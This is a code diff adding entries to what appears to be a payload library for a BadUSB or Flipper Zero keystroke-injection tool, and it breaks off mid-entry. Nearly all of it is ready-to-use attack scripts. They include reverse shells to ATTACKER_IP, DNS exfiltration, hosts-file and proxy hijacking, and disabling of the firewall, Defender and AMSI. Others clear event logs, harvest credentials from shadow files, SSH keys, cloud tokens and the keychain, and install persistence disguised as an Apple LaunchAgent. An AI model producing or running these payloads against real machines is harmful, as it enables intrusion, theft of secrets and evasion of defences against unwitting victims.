+    riskLevel: 'critical',
+    executionTime: '~10s',
+    detectionDifficulty: 'very-hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM DNS Exfiltration Tunnel
+REM Replace YOUR_DOMAIN_HERE with your DNS exfil domain
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $domain = 'YOUR_DOMAIN_HERE'; $data = "$env:COMPUTERNAME|$env:USERNAME|$((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch 'Loopback'} | Select-Object -First 1).IPAddress)"; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)) -replace '\\+','-' -replace '/','_' -replace '=',''; $chunks = [regex]::Matches($encoded, '.{1,60}'); $id = Get-Random -Maximum 9999; for($i=0; $i -lt $chunks.Count; $i++){ $query = "$id.$i.$($chunks.Count).$($chunks[$i].Value).$domain"; try { Resolve-DnsName $query -ErrorAction SilentlyContinue | Out-Null } catch {}; Start-Sleep -Milliseconds 200 }; "DNS exfil complete: $($chunks.Count) queries sent" | Out-File "$env:TEMP\\dns_exfil.log"
+ENTER
+DELAY 2000
+STRING exit
+ENTER`
+  },
+
+  // ==================== NETWORK ATTACK — PROFESSIONAL PENTEST ====================
+  {
+    id: 'net-dns-poison',
+    name: 'DNS Poisoning via Hosts File',
+    category: 'network',
+    description: 'Modifies the Windows hosts file to redirect specified domains to attacker-controlled IPs. Requires admin. Includes backup and restore functionality.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~5s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM DNS Poisoning via Hosts File - Requires Admin
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $hosts=\\\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\\\"; Copy-Item $hosts \\\"$hosts.bak\\\" -Force; $entries = @(\\\"ATTACKER_IP target-domain.com\\\", \\\"ATTACKER_IP login.target-domain.com\\\", \\\"ATTACKER_IP mail.target-domain.com\\\"); foreach($e in $entries){ Add-Content $hosts $e }; ipconfig /flushdns | Out-Null; \\\"Hosts file poisoned with $($entries.Count) entries\\\" | Out-File $env:TEMP\\\\dns_poison.log' -Verb RunAs"
+ENTER`
+  },
+  {
+    id: 'net-proxy-config',
+    name: 'System Proxy Injection',
+    category: 'network',
+    description: 'Configures the system proxy to route HTTP/HTTPS traffic through an attacker-controlled proxy server. Captures all browser traffic. Replace PROXY_IP:PORT.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~4s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM System Proxy Injection
+REM Replace PROXY_IP:PORT with your proxy address
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $proxy = 'PROXY_IP:PORT'; $regPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings'; Set-ItemProperty -Path $regPath -Name ProxyEnable -Value 1; Set-ItemProperty -Path $regPath -Name ProxyServer -Value $proxy; Set-ItemProperty -Path $regPath -Name ProxyOverride -Value '<local>'; "Proxy set to $proxy" | Out-File "$env:TEMP\\proxy_set.log"; "Verify:" | Out-File "$env:TEMP\\proxy_set.log" -Append; Get-ItemProperty $regPath | Select-Object ProxyEnable, ProxyServer | Format-List | Out-String | Out-File "$env:TEMP\\proxy_set.log" -Append
+ENTER
+DELAY 1000
+STRING exit
+ENTER`
+  },
+  {
+    id: 'net-firewall-disable',
+    name: 'Windows Firewall Disable',
+    category: 'network',
+    description: 'Disables Windows Firewall on all profiles (Domain, Private, Public). Requires admin. Logs previous state for potential restoration.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~5s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Windows Firewall Disable - Requires Admin
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $log=\\\"$env:TEMP\\\\fw_disable.log\\\"; \\\"=== BEFORE ===\\\" | Out-File $log; Get-NetFirewallProfile | Select-Object Name,Enabled | Format-Table | Out-String | Out-File $log -Append; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; \\\"=== AFTER ===\\\" | Out-File $log -Append; Get-NetFirewallProfile | Select-Object Name,Enabled | Format-Table | Out-String | Out-File $log -Append; \\\"Firewall disabled at $(Get-Date)\\\" | Out-File $log -Append' -Verb RunAs"
+ENTER`
+  },
+  {
+    id: 'net-share-scanner',
+    name: 'Network Share Scanner',
+    category: 'network',
+    description: 'Scans the local subnet for accessible SMB shares on common ports. Tests read/write access to discovered shares. Useful for lateral movement planning.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~30s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Network Share Scanner
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\share_scan.txt"; $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1); $subnet = $ip.IPAddress -replace '\\d+$',''; "=== SHARE SCAN $(Get-Date) ===" | Out-File $out; "Local IP: $($ip.IPAddress)/$($ip.PrefixLength)" | Out-File $out -Append; "Scanning $($subnet)0/24..." | Out-File $out -Append; 1..254 | ForEach-Object { $target = "$subnet$_"; if(Test-Connection $target -Count 1 -Quiet -TimeoutSeconds 1){ "Host $target - UP" | Out-File $out -Append; try { $shares = net view "\\\\$target" 2>$null; if($shares){ [Environment]::NewLine + "$target SHARES:" | Out-File $out -Append; $shares | Out-File $out -Append } } catch {} } }; "=== SCAN COMPLETE ===" | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'net-port-forward',
+    name: 'Netsh Port Forwarding',
+    category: 'network',
+    description: 'Sets up port forwarding using netsh to redirect traffic from a local port to a remote target. Useful for pivoting through compromised hosts. Requires admin.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~5s',
+    detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Netsh Port Forwarding - Requires Admin
+REM Replace LOCAL_PORT, REMOTE_IP, REMOTE_PORT
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $lport=\\\"LOCAL_PORT\\\"; $rip=\\\"REMOTE_IP\\\"; $rport=\\\"REMOTE_PORT\\\"; netsh interface portproxy add v4tov4 listenport=$lport listenaddress=0.0.0.0 connectport=$rport connectaddress=$rip; $log=\\\"$env:TEMP\\\\portfwd.log\\\"; \\\"Port forward: 0.0.0.0:$lport -> $rip" + ":" + "$rport\\\" | Out-File $log; \\\"=== ALL PORT FORWARDS ===\\\" | Out-File $log -Append; netsh interface portproxy show all | Out-File $log -Append; netsh advfirewall firewall add rule name=\\\"PortForward $lport\\\" dir=in action=allow protocol=tcp localport=$lport | Out-Null; \\\"Firewall rule added\\\" | Out-File $log -Append' -Verb RunAs"
+ENTER`
+  },
+
+  // ==================== EVASION — PROFESSIONAL PENTEST ====================
+  {
+    id: 'evasion-amsi-bypass',
+    name: 'AMSI Bypass for PowerShell',
+    category: 'evasion',
+    description: 'Bypasses the Antimalware Scan Interface (AMSI) in the current PowerShell session. Allows execution of scripts that would normally be flagged by AV. Multiple techniques.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~3s',
+    detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM AMSI Bypass - Multiple Techniques
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $a=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils'); $f=$a.GetField('amsi'+[char]73+'nitFailed','NonPublic,Static'); $f.SetValue($null,$true); if([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null) -eq $true){ "AMSI bypass SUCCESS" } else { "AMSI bypass FAILED - trying alternative..."; [Runtime.InteropServices.Marshal]::WriteByte(([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null)),0x0) }
+ENTER`
+  },
+  {
+    id: 'evasion-defender-exclusion',
+    name: 'Windows Defender Exclusion',
+    category: 'evasion',
+    description: 'Adds folder and process exclusions to Windows Defender to prevent scanning of attacker tools. Requires admin. Excludes common staging directories.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~5s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Windows Defender Exclusion - Requires Admin
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $log=\\\"$env:TEMP\\\\defender_excl.log\\\"; Add-MpPreference -ExclusionPath \\\"C:\\\\Windows\\\\Temp\\\" -Force; Add-MpPreference -ExclusionPath \\\"$env:TEMP\\\" -Force; Add-MpPreference -ExclusionPath \\\"$env:USERPROFILE\\\\Downloads\\\" -Force; Add-MpPreference -ExclusionProcess \\\"powershell.exe\\\" -Force; Add-MpPreference -ExclusionProcess \\\"cmd.exe\\\" -Force; Add-MpPreference -ExclusionExtension \\\".ps1\\\" -Force; Add-MpPreference -ExclusionExtension \\\".exe\\\" -Force; \\\"Exclusions added:\\\" | Out-File $log; Get-MpPreference | Select-Object ExclusionPath,ExclusionProcess,ExclusionExtension | Format-List | Out-String | Out-File $log -Append' -Verb RunAs"
+ENTER`
+  },
+  {
+    id: 'evasion-execpolicy-bypass',
+    name: 'PowerShell Execution Policy Bypass',
+    category: 'evasion',
+    description: 'Bypasses PowerShell execution policy using multiple techniques: Set-ExecutionPolicy, -ExecutionPolicy flag, environment variable, and registry modification.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~4s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM PowerShell Execution Policy Bypass
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING "Current policy: $(Get-ExecutionPolicy)" | Out-File "$env:TEMP\\execpol.log"; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; "New policy: $(Get-ExecutionPolicy)" | Out-File "$env:TEMP\\execpol.log" -Append; "Process policy: $(Get-ExecutionPolicy -Scope Process)" | Out-File "$env:TEMP\\execpol.log" -Append; "User policy: $(Get-ExecutionPolicy -Scope CurrentUser)" | Out-File "$env:TEMP\\execpol.log" -Append; "Bypass active - scripts can now execute" | Out-File "$env:TEMP\\execpol.log" -Append
+ENTER
+DELAY 1000
+STRING exit
+ENTER`
+  },
+  {
+    id: 'evasion-eventlog-clear',
+    name: 'Event Log Clearing',
+    category: 'evasion',
+    description: 'Clears Windows Security, System, Application, and PowerShell event logs to remove evidence of attack activities. Requires admin. Logs are not recoverable.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~6s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Event Log Clearing - Requires Admin
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $log=\\\"$env:TEMP\\\\logclear.txt\\\"; $logs=@(\\\"Security\\\",\\\"System\\\",\\\"Application\\\",\\\"Windows PowerShell\\\",\\\"Microsoft-Windows-PowerShell/Operational\\\",\\\"Microsoft-Windows-Sysmon/Operational\\\"); foreach($l in $logs){ try { $count=(Get-WinEvent -LogName $l -ErrorAction SilentlyContinue).Count; Clear-EventLog -LogName $l -ErrorAction SilentlyContinue; wevtutil cl $l 2>$null; \\\"Cleared $l ($count events)\\\" | Out-File $log -Append } catch { \\\"Failed to clear $l - $_\\\" | Out-File $log -Append } }; \\\"Log clearing complete at $(Get-Date)\\\" | Out-File $log -Append' -Verb RunAs"
+ENTER`
+  },
+  {
+    id: 'evasion-timestomp',
+    name: 'File Timestamp Manipulation',
+    category: 'evasion',
+    description: 'Modifies file timestamps (Created, Modified, Accessed) to match legitimate system files. Helps planted files blend in with existing system files during forensics.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~4s',
+    detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM File Timestamp Manipulation (Timestomp)
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING function Set-FileTimestamp { param([string]$Path, [datetime]$Date); if(Test-Path $Path){ $f = Get-Item $Path -Force; $f.CreationTime = $Date; $f.LastWriteTime = $Date; $f.LastAccessTime = $Date; "Timestomped: $Path -> $Date" } else { "File not found: $Path" } }; $refTime = (Get-Item "C:\\Windows\\System32\\kernel32.dll").LastWriteTime; $target = 'TARGET_FILE_PATH'; Set-FileTimestamp -Path $target -Date $refTime; "Reference: kernel32.dll = $refTime" | Out-File "$env:TEMP\\timestomp.log"; Get-Item $target | Select-Object Name, CreationTime, LastWriteTime, LastAccessTime | Format-List | Out-String | Out-File "$env:TEMP\\timestomp.log" -Append
+ENTER
+DELAY 1000
+STRING exit
+ENTER`
+  },
+
+  // ==================== LINUX — PROFESSIONAL PENTEST ====================
+  {
+    id: 'linux-full-recon',
+    name: 'Linux Full Reconnaissance',
+    category: 'recon',
+    description: 'Comprehensive Linux recon: kernel info, users, network config, listening ports, cron jobs, SUID binaries, writable directories, installed packages.',
+    targetOS: ['linux'],
+    riskLevel: 'low',
+    executionTime: '~15s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Linux Full Reconnaissance
+DELAY 1000
+CTRL-ALT t
+DELAY 1000
+STRING out="/tmp/recon_$(date +%Y%m%d_%H%M%S).txt"; echo "=== SYSTEM ===" > $out; uname -a >> $out; echo "=== HOSTNAME ===" >> $out; hostname -f 2>/dev/null >> $out; echo "=== USERS ===" >> $out; cat /etc/passwd >> $out; echo "=== CURRENT USER ===" >> $out; id >> $out; echo "=== SUDO PRIVS ===" >> $out; sudo -l 2>/dev/null >> $out; echo "=== NETWORK ===" >> $out; ip addr 2>/dev/null || ifconfig >> $out; echo "=== ROUTES ===" >> $out; ip route 2>/dev/null || route -n >> $out; echo "=== LISTENING PORTS ===" >> $out; ss -tlnp 2>/dev/null || netstat -tlnp >> $out; echo "=== ARP ===" >> $out; ip neigh 2>/dev/null || arp -a >> $out; echo "=== CRON JOBS ===" >> $out; crontab -l 2>/dev/null >> $out; ls -la /etc/cron* 2>/dev/null >> $out; echo "=== SUID BINARIES ===" >> $out; find / -perm -4000 -type f 2>/dev/null >> $out; echo "=== WRITABLE DIRS ===" >> $out; find / -writable -type d 2>/dev/null | head -30 >> $out; echo "=== INSTALLED PACKAGES ===" >> $out; dpkg -l 2>/dev/null || rpm -qa 2>/dev/null >> $out; cat $out
+ENTER`
+  },
+  {
+    id: 'linux-reverse-shell',
+    name: 'Linux Bash Reverse Shell',
+    category: 'reverse-shells',
+    description: 'Spawns a bash TCP reverse shell to a specified attacker IP and port. Replace ATTACKER_IP and ATTACKER_PORT. Includes fallback methods: python, netcat, perl.',
+    targetOS: ['linux'],
+    riskLevel: 'critical',
+    executionTime: '~3s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Linux Bash Reverse Shell
+REM Replace ATTACKER_IP and ATTACKER_PORT
+DELAY 1000
+CTRL-ALT t
+DELAY 1000
+STRING bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' 2>/dev/null || python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' 2>/dev/null || nc -e /bin/bash ATTACKER_IP ATTACKER_PORT 2>/dev/null || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+ENTER`
+  },
+  {
+    id: 'linux-ssh-persistence',
+    name: 'Linux SSH Key Persistence',
+    category: 'persistence',
+    description: 'Generates an SSH key pair and adds the public key to authorized_keys for persistent access. Creates .ssh directory if needed with correct permissions.',
+    targetOS: ['linux'],
+    riskLevel: 'high',
+    executionTime: '~5s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Linux SSH Key Persistence
+REM Adds attacker SSH key for persistent access
+DELAY 1000
+CTRL-ALT t
+DELAY 1000
+STRING mkdir -p ~/.ssh && chmod 700 ~/.ssh; echo "PASTE_YOUR_PUBLIC_KEY_HERE" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys; echo "SSH key persistence installed"; echo "Authorized keys:"; cat ~/.ssh/authorized_keys; echo "SSH service status:"; systemctl status sshd 2>/dev/null || service ssh status 2>/dev/null
+ENTER`
+  },
+  {
+    id: 'linux-cred-harvest',
+    name: 'Linux Credential Harvest',
+    category: 'credentials',
+    description: 'Harvests credential-related files: /etc/shadow (if readable), bash history, SSH keys, .netrc, .pgpass, AWS/GCP/Azure credentials, and environment variables.',
+    targetOS: ['linux'],
+    riskLevel: 'high',
+    executionTime: '~8s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Linux Credential Harvest
+DELAY 1000
+CTRL-ALT t
+DELAY 1000
+STRING out="/tmp/creds_$(date +%s).txt"; echo "=== SHADOW FILE ===" > $out; cat /etc/shadow 2>/dev/null >> $out || echo "No read access" >> $out; echo "=== BASH HISTORY ===" >> $out; cat ~/.bash_history 2>/dev/null | tail -100 >> $out; echo "=== SSH PRIVATE KEYS ===" >> $out; find /home -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | while read f; do echo "FOUND: $f"; head -2 "$f"; done >> $out; echo "=== SSH CONFIGS ===" >> $out; cat ~/.ssh/config 2>/dev/null >> $out; echo "=== .NETRC ===" >> $out; cat ~/.netrc 2>/dev/null >> $out; echo "=== AWS CREDS ===" >> $out; cat ~/.aws/credentials 2>/dev/null >> $out; echo "=== GCP CREDS ===" >> $out; cat ~/.config/gcloud/credentials.db 2>/dev/null | strings >> $out; echo "=== AZURE CREDS ===" >> $out; cat ~/.azure/accessTokens.json 2>/dev/null >> $out; echo "=== ENV VARS WITH SECRETS ===" >> $out; env | grep -iE 'key|token|secret|pass|cred|auth' >> $out; echo "=== .PGPASS ===" >> $out; cat ~/.pgpass 2>/dev/null >> $out; echo "=== GNUPG ===" >> $out; ls -la ~/.gnupg/ 2>/dev/null >> $out; cat $out
+ENTER`
+  },
+  {
+    id: 'linux-privesc-check',
+    name: 'Linux Privilege Escalation Check',
+    category: 'recon',
+    description: 'Comprehensive privesc enumeration: SUID/SGID binaries, writable cron jobs, sudo permissions, capabilities, kernel version, Docker group membership, writable /etc/passwd.',
+    targetOS: ['linux'],
+    riskLevel: 'medium',
+    executionTime: '~15s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Linux Privilege Escalation Check
+DELAY 1000
+CTRL-ALT t
+DELAY 1000
+STRING out="/tmp/privesc_$(date +%s).txt"; echo "=== KERNEL ===" > $out; uname -a >> $out; echo "=== SUDO PERMISSIONS ===" >> $out; sudo -l 2>/dev/null >> $out; echo "=== SUID BINARIES ===" >> $out; find / -perm -4000 -type f 2>/dev/null >> $out; echo "=== SGID BINARIES ===" >> $out; find / -perm -2000 -type f 2>/dev/null >> $out; echo "=== CAPABILITIES ===" >> $out; getcap -r / 2>/dev/null >> $out; echo "=== WRITABLE CRON ===" >> $out; find /etc/cron* -writable 2>/dev/null >> $out; ls -la /etc/crontab >> $out; cat /etc/crontab >> $out; echo "=== WRITABLE /etc/passwd ===" >> $out; ls -la /etc/passwd >> $out; test -w /etc/passwd && echo "WRITABLE!" >> $out; echo "=== DOCKER GROUP ===" >> $out; id | grep -i docker >> $out; echo "=== LXD GROUP ===" >> $out; id | grep -i lxd >> $out; echo "=== WORLD WRITABLE FILES ===" >> $out; find / -writable -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -50 >> $out; echo "=== PROCESSES AS ROOT ===" >> $out; ps aux | grep "^root" | head -30 >> $out; echo "=== INTERNAL PORTS ===" >> $out; ss -tlnp 2>/dev/null >> $out; cat $out
+ENTER`
+  },
+
+  // ==================== macOS — PROFESSIONAL PENTEST ====================
+  {
+    id: 'macos-full-recon',
+    name: 'macOS Full Reconnaissance',
+    category: 'recon',
+    description: 'Comprehensive macOS recon: system profiler, network config, users, installed apps, running processes, login items, SIP status, and Gatekeeper settings.',
+    targetOS: ['macos'],
+    riskLevel: 'low',
+    executionTime: '~15s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM macOS Full Reconnaissance
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING out="/tmp/recon_$(date +%Y%m%d_%H%M%S).txt"; echo "=== SYSTEM ===" > $out; sw_vers >> $out; uname -a >> $out; echo "=== HARDWARE ===" >> $out; system_profiler SPHardwareDataType >> $out; echo "=== NETWORK ===" >> $out; ifconfig >> $out; echo "=== ROUTES ===" >> $out; netstat -rn >> $out; echo "=== DNS ===" >> $out; scutil --dns | head -50 >> $out; echo "=== USERS ===" >> $out; dscl . list /Users | grep -v '^_' >> $out; echo "=== CURRENT USER ===" >> $out; id >> $out; echo "=== INSTALLED APPS ===" >> $out; ls /Applications/ >> $out; echo "=== RUNNING PROCESSES ===" >> $out; ps aux >> $out; echo "=== LOGIN ITEMS ===" >> $out; osascript -e 'tell application "System Events" to get the name of every login item' 2>/dev/null >> $out; echo "=== SIP STATUS ===" >> $out; csrutil status >> $out; echo "=== GATEKEEPER ===" >> $out; spctl --status >> $out; echo "=== FIREWALL ===" >> $out; /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate >> $out; open $out
+ENTER`
+  },
+  {
+    id: 'macos-reverse-shell',
+    name: 'macOS Reverse Shell',
+    category: 'reverse-shells',
+    description: 'Spawns a reverse shell on macOS using bash or python3. Opens Terminal via Spotlight, establishes TCP connection. Replace ATTACKER_IP and ATTACKER_PORT.',
+    targetOS: ['macos'],
+    riskLevel: 'critical',
+    executionTime: '~4s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM macOS Reverse Shell
+REM Replace ATTACKER_IP and ATTACKER_PORT
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' 2>/dev/null || python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+ENTER`
+  },
+  {
+    id: 'macos-keychain-dump',
+    name: 'macOS Keychain Dump',
+    category: 'credentials',
+    description: 'Dumps the macOS login keychain using security command. Lists all generic and internet passwords. May prompt user for keychain password depending on items.',
+    targetOS: ['macos'],
+    riskLevel: 'high',
+    executionTime: '~8s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM macOS Keychain Dump
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING out="/tmp/keychain_dump.txt"; echo "=== KEYCHAIN LIST ===" > $out; security list-keychains >> $out; echo "=== GENERIC PASSWORDS ===" >> $out; security dump-keychain -d 2>/dev/null >> $out; echo "=== INTERNET PASSWORDS ===" >> $out; security find-internet-password -ga "" 2>&1 | head -50 >> $out; echo "=== WIFI PASSWORDS ===" >> $out; networksetup -listpreferredwirelessnetworks en0 2>/dev/null | awk '{print $1}' | while read ssid; do [ -n "$ssid" ] && echo -n "$ssid: " && security find-generic-password -wa "$ssid" 2>/dev/null || echo "(access denied)"; done >> $out; open $out
+ENTER`
+  },
+  {
+    id: 'macos-launchagent-persist',
+    name: 'macOS LaunchAgent Persistence',
+    category: 'persistence',
+    description: 'Creates a LaunchAgent plist that runs a payload at user login. Uses a com.apple-like naming convention for stealth. Payload survives reboots.',
+    targetOS: ['macos'],
+    riskLevel: 'high',
+    executionTime: '~5s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM macOS LaunchAgent Persistence
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING mkdir -p ~/Library/LaunchAgents; cat > ~/Library/LaunchAgents/com.apple.security.updater.plist << 'PLIST'
+ENTER
+STRING <?xml version="1.0" encoding="UTF-8"?>
+ENTER
+STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+ENTER
+STRING <plist version="1.0">
+ENTER
+STRING <dict>
+ENTER
+STRING   <key>Label</key><string>com.apple.security.updater</string>
+ENTER
+STRING   <key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>REPLACE_WITH_PAYLOAD_COMMAND</string></array>
+ENTER
+STRING   <key>RunAtLoad</key><true/>
+ENTER
+STRING   <key>KeepAlive</key><false/>
+ENTER
+STRING </dict>
+ENTER
+STRING </plist>
+ENTER
+STRING PLIST
+ENTER
+STRING chmod 644 ~/Library/LaunchAgents/com.apple.security.updater.plist; launchctl load ~/Library/LaunchAgents/com.apple.security.updater.plist 2>/dev/null; echo "LaunchAgent installed and loaded"
+ENTER`
+  },
+  {
+    id: 'macos-screenshot',
+    name: 'macOS Screenshot & Encode',
+    category: 'exfiltration',
+    description: 'Takes a screenshot of all displays using screencapture, saves as PNG, and base64 encodes it for exfiltration. Includes file size and timestamp metadata.',
+    targetOS: ['macos'],
+    riskLevel: 'medium',
+    executionTime: '~5s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM macOS Screenshot & Base64 Encode
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING ts=$(date +%Y%m%d_%H%M%S); scpath="/tmp/screen_$ts.png"; screencapture -x $scpath; if [ -f "$scpath" ]; then echo "Screenshot saved: $scpath"; echo "Size: $(du -h $scpath | cut -f1)"; base64 -i $scpath -o "$scpath.b64"; echo "Base64 saved: $scpath.b64"; echo "B64 size: $(du -h $scpath.b64 | cut -f1)"; else echo "Screenshot failed"; fi
+ENTER`
+  },
+
+  // ==================== FLIPPER-SPECIFIC FORMAT SCRIPTS ====================
+  {
+    id: 'flipper-win-revshell',
+    name: 'Flipper: Windows PowerShell Reverse Shell',
+    category: 'reverse-shells',
+    description: 'Flipper Zero BadUSB format reverse shell. Opens hidden PowerShell and establishes TCP reverse connection. Replace ATTACKER_IP and ATTACKER_PORT.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~5s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    flipperCompat: true,
+    script: `ID 1234:5678
+REM Flipper Zero - Windows Reverse Shell
+REM Replace ATTACKER_IP and ATTACKER_PORT
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile
+ENTER
+DELAY 1500
+STRING $c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
+ENTER`
+  },
+  {
+    id: 'flipper-quick-creds',
+    name: 'Flipper: Quick Credential Grab',
+    category: 'credentials',
+    description: 'Flipper Zero optimized fast credential grab. Dumps WiFi passwords, credential manager, and browser paths in under 10 seconds. Saves to temp file.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~8s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    flipperCompat: true,
+    script: `ID 1234:5678
+REM Flipper Zero - Quick Credential Grab
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile
+ENTER
+DELAY 1500
